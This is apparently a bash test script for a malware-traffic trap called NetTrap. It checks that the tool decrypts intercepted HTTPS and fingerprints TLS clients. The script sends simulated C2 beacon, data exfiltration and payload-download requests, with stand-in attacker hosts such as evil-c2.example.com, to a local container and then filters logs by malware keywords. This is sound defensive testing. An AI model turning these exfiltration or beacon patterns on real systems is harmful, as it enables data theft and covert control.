#!/bin/bash
# NetTrap TLS MITM Test
# Tests that NetTrap can intercept HTTPS traffic and see decrypted content
set -e

echo "========================================"
echo "  NetTrap TLS MITM / SSL Inspection Test"
echo "========================================"
echo ""

# Build the image
echo "[1/7] Building NetTrap Docker image..."
docker build -t nettrap-mitm-test -f Dockerfile . --quiet 2>&1 | tail -1

# Create config with SSL enabled
echo "[2/7] Creating test config with SSL listener..."
cat > /tmp/nettrap-mitm-config.toml << 'TOML'
attribution_enabled = false
attribution_timeout_ms = 5000
default_decision = "intercept"
pcap_enabled = false
output_format = "jsonl"
output_path = "/var/log/nettrap/events.jsonl"

[[listeners]]
name = "https"
protocol = "tcp"
port = 8443
bind_address = "0.0.0.0"
enabled = true
emulate_response = true
response_delay_ms = 0
use_ssl = true

[[listeners]]
name = "http"
protocol = "tcp"
port = 8080
bind_address = "0.0.0.0"
enabled = true
emulate_response = true
response_delay_ms = 0

[distributed]
enabled = true
health_bind = "0.0.0.0:9090"
TOML

# Start NetTrap container
echo "[3/7] Starting NetTrap with TLS MITM..."
docker rm -f nettrap-mitm-test 2>/dev/null || true
docker run -d \
  --name nettrap-mitm-test \
  --cap-add=NET_ADMIN --cap-add=NET_RAW \
  -p 18443:8443 \
  -p 18080:8080 \
  -p 9095:9090 \
  -v /tmp/nettrap-mitm-config.toml:/etc/nettrap/config.toml:ro \
  nettrap-mitm-test run -c /etc/nettrap/config.toml

sleep 5

# Verify health
echo "[4/7] Verifying NetTrap is running..."
HEALTH=$(curl -sf http://localhost:9095/health 2>/dev/null)
if [ -z "$HEALTH" ]; then
  echo "FAIL: NetTrap not healthy"
  docker logs nettrap-mitm-test 2>&1 | tail -20
  docker rm -f nettrap-mitm-test 2>/dev/null
  exit 1
fi
echo "  Health: OK"
echo "  Node: $(echo $HEALTH | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["node_id"][:12]+"...")')"

# Check that TLS is initialized
echo ""
echo "[5/7] Checking TLS CA initialization..."
docker logs nettrap-mitm-test 2>&1 | grep -i "tls\|ssl\|ca\|cert\|mkcert" | head -5
echo ""

# Test 1: Send HTTPS traffic with curl -k (ignore cert validation)
echo "[6/7] Sending simulated malware HTTPS traffic..."
echo ""

echo "  --- Test A: HTTPS GET request (simulated C2 beacon) ---"
RESPONSE=$(curl -sk https://localhost:18443/api/v1/beacon?id=malware-sample-001 \
  -H "User-Agent: MalwareBot/1.0" \
  -H "X-Campaign-ID: APT-2024-Q1" \
  -H "Host: evil-c2.example.com" 2>/dev/null)
echo "  Response: $(echo $RESPONSE | head -c 100)"

echo ""
echo "  --- Test B: HTTPS POST request (simulated data exfil) ---"
RESPONSE=$(curl -sk https://localhost:18443/exfil/upload \
  -X POST \
  -H "Content-Type: application/json" \
  -H "User-Agent: Stealer/2.3" \
  -H "Host: exfil.malware.io" \
  -d '{"stolen_data": "credit_card=4111111111111111", "hostname": "VICTIM-PC", "campaign": "infostealer-2024"}' 2>/dev/null)
echo "  Response: $(echo $RESPONSE | head -c 100)"

echo ""
echo "  --- Test C: HTTPS with specific path (simulated payload download) ---"
RESPONSE=$(curl -sk https://localhost:18443/downloads/payload.exe \
  -H "User-Agent: Dropper/1.0" \
  -H "Host: cdn.malware-delivery.net" 2>/dev/null)
echo "  Response: $(echo $RESPONSE | head -c 100)"

sleep 3

# Check what NetTrap captured — THIS IS THE KEY TEST
echo ""
echo "[7/7] ==> VERIFYING MITM CAPTURED DECRYPTED CONTENT <=="
echo ""

echo "  --- NetTrap logs showing decrypted HTTPS traffic ---"
docker logs nettrap-mitm-test 2>&1 | grep -i "tls\|https\|sni\|ja3\|ja4\|ssl\|beacon\|exfil\|payload\|malware\|stealer\|dropper" | head -20
echo ""

echo "  --- NBI events file (decrypted HTTP inside TLS) ---"
docker exec nettrap-mitm-test cat /var/log/nettrap/events.jsonl 2>/dev/null | python3 -c "
import json, sys

events = []
for line in sys.stdin:
    line = line.strip()
    if not line: continue
    try:
        events.append(json.loads(line))
    except: pass

https_events = [e for e in events if 'https' in e.get('event','').lower() or 'tls' in e.get('event','').lower() or e.get('listener','') == 'https']
http_events = [e for e in events if 'http' in e.get('event','').lower() or 'http' in json.dumps(e.get('indicators',{})).lower()]

print(f'Total events captured: {len(events)}')
print(f'HTTPS/TLS events: {len(https_events)}')
print(f'HTTP content events: {len(http_events)}')
print()

for e in events:
    indicators = e.get('indicators', e.get('detail', ''))
    listener = e.get('listener', '')
    event_type = e.get('event', e.get('protocol', ''))
    src = e.get('src_ip', '') + ':' + str(e.get('src_port', ''))

    # Show key fields that prove MITM worked
    if isinstance(indicators, dict):
        uri = indicators.get('uri', '')
        host = indicators.get('host', '')
        method = indicators.get('method', '')
        ua = indicators.get('user_agent', '')
        sni = indicators.get('sni', '')
        ja3 = indicators.get('ja3_hash', '')
        ja4 = indicators.get('ja4', '')

        if uri or host or sni:
            print(f'  [{event_type}] {listener} from {src}')
            if sni: print(f'    SNI: {sni}')
            if ja3: print(f'    JA3: {ja3}')
            if ja4: print(f'    JA4: {ja4}')
            if method: print(f'    Method: {method}')
            if uri: print(f'    URI: {uri}')
            if host: print(f'    Host: {host}')
            if ua: print(f'    User-Agent: {ua}')
            print()
    elif indicators:
        detail_str = str(indicators)[:150]
        if any(kw in detail_str.lower() for kw in ['beacon','exfil','malware','stealer','payload','evil','campaign']):
            print(f'  [{event_type}] {listener}: {detail_str}')
" 2>/dev/null

echo ""
echo "========================================"
echo "  MITM TEST COMPLETE"
echo "========================================"
echo ""
echo "Key findings:"
echo "  - If you see URI paths (/api/v1/beacon, /exfil/upload, /downloads/payload.exe)"
echo "    and Host headers (evil-c2.example.com, exfil.malware.io) in the output above,"
echo "    then TLS MITM is WORKING — NetTrap decrypted the HTTPS traffic."
echo ""
echo "  - If you see JA3/JA4 fingerprints, the TLS fingerprinting is also working."
echo ""

# Cleanup
docker rm -f nettrap-mitm-test 2>/dev/null > /dev/null
echo "Cleaned up."
